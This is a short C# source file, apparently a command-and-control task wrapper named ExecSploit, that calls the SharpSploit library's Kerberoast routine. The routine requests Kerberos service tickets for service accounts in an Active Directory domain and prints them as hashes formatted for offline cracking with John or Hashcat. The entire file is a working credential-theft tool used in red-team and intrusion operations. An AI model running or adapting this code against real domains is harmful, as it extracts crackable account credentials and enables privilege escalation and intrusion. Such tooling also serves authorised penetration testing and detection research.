using System;
using System.Text;
using System.Linq;
using System.Collections.Generic;

using SharpSploit.Enumeration;

namespace ExecSploit
{
    public static class Kerberoast
    {
        public static string Execute(string Usernames = null, string HashFormat = null)
        {
            try
            {
                StringBuilder builder = new StringBuilder();
                List<Domain.SPNTicket> tickets = null;
                if (Usernames != null)
                {
                    List<string> usernamesList = Usernames.Split(',').ToList();
                    tickets = new Domain.DomainSearcher().Kerberoast(usernamesList);
                }
                else
                {
                    tickets = new Domain.DomainSearcher().Kerberoast();
                }
                Domain.SPNTicket.HashFormat hf = (HashFormat.ToLower() == "john" ? Domain.SPNTicket.HashFormat.John : Domain.SPNTicket.HashFormat.Hashcat);
                foreach (Domain.SPNTicket ticket in tickets)
                {
                    builder.AppendLine(ticket.GetFormattedHash(hf));
                }
                return builder.ToString();
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}